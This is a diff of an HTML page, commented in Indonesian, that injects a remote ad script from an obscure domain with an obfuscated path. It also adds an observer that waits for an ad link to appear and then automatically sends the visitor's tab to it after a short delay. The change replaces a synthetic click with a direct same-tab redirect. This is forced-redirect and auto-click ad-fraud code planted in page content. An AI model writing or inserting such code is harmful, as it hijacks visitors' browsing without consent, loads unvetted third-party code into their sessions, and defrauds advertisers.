@@ -15,32 +15,27 @@
 <body>
   <!-- Inject script iklan -->
   <script>
-    (function(xxwh){
+    (function(tusf){
       var d = document,
           s = d.createElement('script'),
           l = d.scripts[d.scripts.length - 1];
-      s.settings = xxwh || {};
-      s.src = "//smoggy-construction.com/bjXHV.sVdrGmlj0mYAW/cy/GevmZ9Ru_ZPUhljksPuTyY/1XM/TxggwgMKTPg-tLNyjpU/xwOTD/AwxQO/Qc";
+      s.settings = tusf || {};
+      s.src = "\/\/smoggy-construction.com\/bzXTV.sId\/G\/lR0AYZWucr\/Ye_mM9iueZRU\/llkFPVTRYh1xMWT\/gLwwMcTygtteN\/jjUMxCOVD\/AAxQOcQn";
       s.async = true;
       s.referrerPolicy = 'no-referrer-when-downgrade';
       l.parentNode.insertBefore(s, l);
-    })({});
+    })({})
   </script>
 
-  <!-- Observer untuk tunggu elemen muncul lalu auto klik -->
+  <!-- Observer untuk tunggu elemen muncul lalu auto klik di tab yang sama -->
   <script>
     const observer = new MutationObserver(() => {
       const adLink = document.querySelector('a.vast-blocker[href]');
       if (adLink) {
         observer.disconnect(); // stop ngamatin
         setTimeout(() => {
-          const event = new MouseEvent('click', {
-            view: window,
-            bubbles: true,
-            cancelable: true
-          });
-          adLink.dispatchEvent(event);
-        }, 1500); // kasih delay sedikit biar smooth
+          window.location.href = adLink.href; // buka langsung di tab yang sama
+        }, 1500); // delay biar smooth
       }
     });
 
